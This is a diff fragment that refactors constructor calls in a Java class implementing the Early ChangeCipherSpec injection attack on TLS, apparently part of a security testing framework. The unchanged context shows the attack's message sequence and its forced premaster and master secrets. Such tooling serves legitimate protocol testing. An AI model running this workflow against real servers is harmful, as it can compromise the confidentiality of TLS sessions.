@@ -65,13 +65,13 @@ public class EarlyCCSAttack extends Attacker<EarlyCCSCommandConfig> {
 
         WorkflowTrace workflowTrace = tlsContext.getWorkflowTrace();
         List<ProtocolMessage> messageList = new LinkedList<>();
-        messageList.add(new ServerHelloMessage());
-        messageList.add(new CertificateMessage());
-        messageList.add(new ServerHelloDoneMessage());
+        messageList.add(new ServerHelloMessage(tlsConfig));
+        messageList.add(new CertificateMessage(tlsConfig));
+        messageList.add(new ServerHelloDoneMessage(tlsConfig));
         ReceiveAction receiveAction = new ReceiveAction(messageList);
         workflowTrace.add(receiveAction);
         messageList = new LinkedList<>();
-        RSAClientKeyExchangeMessage clientKeyExchange1 = new RSAClientKeyExchangeMessage();
+        RSAClientKeyExchangeMessage clientKeyExchange1 = new RSAClientKeyExchangeMessage(tlsConfig);
         messageList.add(clientKeyExchange1);
         ModifiableByteArray modpms = new ModifiableByteArray();
         modpms.setModification(ByteArrayModificationFactory.explicitValue(pms));
@@ -80,15 +80,15 @@ public class EarlyCCSAttack extends Attacker<EarlyCCSCommandConfig> {
         modms.setModification(ByteArrayModificationFactory.explicitValue(ms));
         clientKeyExchange1.setMasterSecret(modms);
         clientKeyExchange1.setGoingToBeSent(false);
-        ChangeCipherSpecMessage changeCipherSpec1 = new ChangeCipherSpecMessage();
+        ChangeCipherSpecMessage changeCipherSpec1 = new ChangeCipherSpecMessage(tlsConfig);
         messageList.add(changeCipherSpec1);
         changeCipherSpec1.setGoingToBeSent(false);
-        FinishedMessage fin1 = new FinishedMessage();
+        FinishedMessage fin1 = new FinishedMessage(tlsConfig);
         fin1.setGoingToBeSent(false);
 
-        messageList.add(new ChangeCipherSpecMessage());
+        messageList.add(new ChangeCipherSpecMessage(tlsConfig));
 
-        RSAClientKeyExchangeMessage clientKeyExchange2 = new RSAClientKeyExchangeMessage();
+        RSAClientKeyExchangeMessage clientKeyExchange2 = new RSAClientKeyExchangeMessage(tlsConfig);
         messageList.add(clientKeyExchange2);
         modpms = new ModifiableByteArray();
         modpms.setModification(ByteArrayModificationFactory.explicitValue(pms));
@@ -96,13 +96,13 @@ public class EarlyCCSAttack extends Attacker<EarlyCCSCommandConfig> {
         modms = new ModifiableByteArray();
         modms.setModification(ByteArrayModificationFactory.explicitValue(ms));
         clientKeyExchange2.setMasterSecret(modms);
-        messageList.add(new FinishedMessage());
+        messageList.add(new FinishedMessage(tlsConfig));
         SendAction sendAction = new SendAction(messageList);
         workflowTrace.add(sendAction);
         messageList = new LinkedList<>();
 
-        messageList.add(new ChangeCipherSpecMessage());
-        messageList.add(new FinishedMessage());
+        messageList.add(new ChangeCipherSpecMessage(tlsConfig));
+        messageList.add(new FinishedMessage(tlsConfig));
         receiveAction = new ReceiveAction(messageList);
         workflowTrace.add(receiveAction);
         workflowExecutor.executeWorkflow();
